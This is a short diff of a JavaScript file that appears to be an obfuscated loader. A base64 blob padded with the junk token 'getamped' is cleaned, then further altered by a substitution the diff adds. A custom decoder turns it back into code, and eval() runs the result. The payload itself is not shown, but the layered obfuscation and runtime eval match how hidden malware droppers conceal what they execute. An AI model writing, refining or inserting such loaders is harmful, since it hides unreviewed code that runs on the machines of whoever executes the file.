@@ -4,16 +4,14 @@ var superString = 'dHJ5ewp2YXIgbG9uZ1RleHQxID0gIkx5OGpjbVZuYVc5dUlGTjFjR1Z5VTNSe
 
 //#endregion
 
-var viniciusDavid = superString.replace(/getamped/g, "");
+var viniciusDavid = superString.replace(/getamped/g, "").replace(/%>/g, "A");;
 
 var xotaX = getampas63mais1(viniciusDavid);
 
-eval(xotaX)
-
-const base64_chars =
-    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+eval(xotaX);
 
 function getampas63mais1(encodedstring) {
+    const base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
     var in_len = encodedstring.length;
     var i = 0;
     var j = 0;
